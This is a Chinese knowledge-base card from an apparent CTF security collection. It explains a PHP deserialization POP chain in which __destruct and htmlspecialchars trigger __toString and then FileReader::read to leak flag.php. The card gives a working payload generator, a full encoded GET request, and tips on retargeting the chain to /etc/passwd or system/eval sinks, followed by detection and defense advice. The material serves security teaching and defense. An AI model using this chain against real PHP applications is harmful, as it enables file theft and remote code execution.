---
id: web-php-deserialization-destruct-tostring-htmlspecialchars-file-read
title: PHP POP 链：__destruct→render→htmlspecialchars 触发 __toString→method_exists→FileReader 读文件
type: scenario
domain: web
path: web/php/deserialization
technique: php-pop-chain-destruct-tostring-htmlspecialchars-file-read
tags:
- php
- deserialization
- pop-chain
- magic-methods
- destruct
- tostring
- method-exists
- file-read
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V182
  verified_at: '2026-11-06T20:13:48+08:00'
  notes: 已对照原文核对（含11张图片）；未运行 PHP；__destruct→render→htmlspecialchars→__toString→method_exists→read 与源码一致，format=html 为触发关键
url: /docs/web/php/deserialization/web-php-deserialization-destruct-tostring-htmlspecialchars-file-read/
draft: false
kb_aliases:
- OutputHandler POP 链
- DataProcessor __toString
- htmlspecialchars 触发 __toString
- method_exists 读文件
- format=html 反序列化
- FileReader flag.php
---

## 一句话结论

当 `unserialize($_GET['data'])` 可控、且类图中存在 `__destruct → render → htmlspecialchars($object)` 的路径时，`htmlspecialchars` 会强制把对象转成字符串，触发 `__toString → process() → method_exists($reader,'read') → FileReader::read()`，最终用 `file_get_contents()` 读取 `flag.php` 并回显；关键门槛是把 `format` 设为 `html`，否则 `render()` 直接返回对象、不会触发字符串转换。

## 原理

- 入口是 `unserialize($_GET['data'])`：攻击者可以控制对象类型与属性，不需要目标显式调用业务方法。
- 反序列化结束时，`OutputHandler` 对象被销毁，PHP 自动调用 `__destruct()`；它调用 `render()`。
- `render()` 的逻辑：
  ```php
  $output = $this->processor;
  if ($this->format === 'html') {
      return '<pre>' . htmlspecialchars($output) . '</pre>';
  }
  return $output;
  ```
  如果 `format` 不是 `html`，函数直接返回对象本身，不会发生字符串转换；只有 `format === 'html'` 时，`htmlspecialchars()` 的参数被要求是字符串，PHP 才会调用 `DataProcessor::__toString()`。
- `DataProcessor::__toString()` 返回 `$this->process()`；`process()` 检查 `$this->reader !== null && method_exists($this->reader, 'read')`，满足后调用 `$this->reader->read()`。
- `FileReader::read()` 用 `file_exists()` + `file_get_contents()` 读取 `$this->filename`，`echo $this->content` 回显，并返回内容。把 `filename` 设为 `flag.php` 即可读出 flag。
- 整条链：
  ```text
  OutputHandler::__destruct()
    → render()
      → htmlspecialchars($processor)   // 对象转字符串
        → DataProcessor::__toString()
          → process()
            → method_exists($reader,'read')
              → FileReader::read()
                → file_get_contents('flag.php')
  ```
- 为什么需要 `format='html'`：如果 `format` 保持默认 `text`，`render()` 只是 `return $output;`，不会对对象做字符串操作；这是本题最容易漏掉的一步。

## 触发条件

- 存在用户可控的 `unserialize()`（GET/POST/Cookie/参数），且目标类已定义/可自动加载。
- `allowed_classes` 未限制为 `false`，攻击者可以实例化 `OutputHandler`、`DataProcessor`、`FileReader`。
- `FileReader::read()` 的目标文件存在且 Web 进程可读（如 `flag.php`）；`file_get_contents` 未被禁用。
- 攻击者知道类名与属性名（源码泄露、报错、白盒题目），能构造序列化字符串。
- `format` 必须设为 `html`，否则 `__toString` 不会被触发。

## 利用步骤

1. 阅读源码，确认 `unserialize` 入口与三个类的属性/方法；标记 `__destruct`、`__toString`、`method_exists`、`file_get_contents` 等关键点。
2. 按链子构造对象图：`OutputHandler->processor = DataProcessor`；`DataProcessor->reader = FileReader`；`FileReader->filename = 'flag.php'`；`OutputHandler->format = 'html'`。
3. `serialize($o)` 后 URL 编码，作为 `data` 参数发送；`__destruct` 在请求结束/对象释放时触发。
4. 观察响应中的 `flag.php` 内容；若没有输出，检查 `format` 是否为 `html`、`method_exists` 是否通过、`filename` 路径是否正确。
5. 也可把 `read()` 的目标换成其他敏感文件（如 `/etc/passwd`、源码、配置），或把终点换成 `include`/`highlight_file`/`system` 等其它 sink。

## PoC

生成 payload：

```php
<?php
class FileReader {
    public $filename;
    public $content;
}
class DataProcessor {
    public $reader;
    public $data;
}
class OutputHandler {
    public $processor;
    public $format;
}

$f = new FileReader();
$f->filename = "flag.php";
$f->content = "";

$p = new DataProcessor();
$p->reader = $f;
$p->data = null;

$o = new OutputHandler();
$o->processor = $p;
$o->format = "html";

echo urlencode(serialize($o));
```

请求：

```http
GET /index.php?data=O%3A13%3A%22OutputHandler%22%3A2%3A%7Bs%3A9%3A%22processor%22%3BO%3A13%3A%22DataProcessor%22%3A2%3A%7Bs%3A6%3A%22reader%22%3BO%3A10%3A%22FileReader%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3Bs%3A0%3A%22%22%3B%7Ds%3A4%3A%22data%22%3BN%3B%7Ds%3A6%3A%22format%22%3Bs%3A4%3A%22html%22%3B%7D HTTP/1.1
```

（实际序列化字符串以本地 PHP 生成的为准；不同 PHP 版本对属性顺序/长度处理一致，但手写容易错。）

## 变体与关联

- **触发点变体**：`__destruct`、`__wakeup`、`__toString`、`__get`、`__invoke` 都可作为 POP 链起点；本题用 `__destruct`，其它题可能用 `preg_match`/`strlen`/字符串拼接触发 `__toString`。
- **字符串转换函数**：`htmlspecialchars`、`strlen`、`preg_match`、`strpos`、字符串连接、`echo` 等都会触发 `__toString`；`format` 这类“看似无关”的配置项常是链子的开关。
- **调度点**：`method_exists($obj,'read')`、`is_callable($obj)`、`call_user_func`、`$obj->$method()` 都是把对象图导向任意方法的常见跳板。
- **终点变体**：`FileReader::read()` 是文件读取；把同类结构换成 `include`、`highlight_file`、`system`、`eval` 可升级为文件包含/RCE（需相应类与方法）。
- **关联：现有 POP 链卡**。`web/php/deserialization` 下已有 `__wakeup→preg_match→__toString→__get→is_callable→__invoke` 等多跳链；本卡是更短的 `__destruct→__toString→method_exists→read` 变体，适合作为 POP 链入门/CTF 快速题。
- **防护对比**：`unserialize` 换成 `json_decode`/`allowed_classes=>false`/签名校验，可从入口阻断；仅过滤 `O:` 字符串容易被绕过。

## 检测与防御

- **入口治理**：禁止对用户输入直接 `unserialize`；改用 `json_decode`、`allowed_classes` 白名单、HMAC 签名；对 Cookie/隐藏字段同样处理。
- **代码审计**：搜索 `unserialize($_GET`、`unserialize($_POST`、`unserialize($_COOKIE`、`unserialize(base64_decode`；追踪可控对象到 `__destruct/__wakeup/__toString` 及文件/命令 sink。
- **魔术方法治理**：`__destruct`/`__wakeup` 中不要做危险操作；`__toString` 不要直接返回敏感内容或调用文件/命令函数；`method_exists`/`is_callable` 的结果不要直接用于调用用户可控对象。
- **权限**：Web 进程最小权限；flag/配置文件放在 Web 根目录之外；禁用 `file_get_contents` 等不必要函数只能增加难度，不能替代入口修复。
- **检测**：WAF/日志关注 `data=` 中的 `O:`、`s:`、`__destruct`、`FileReader`、`flag.php`；PHP 错误日志中的 `unserialize()` 警告；异常文件读取请求。
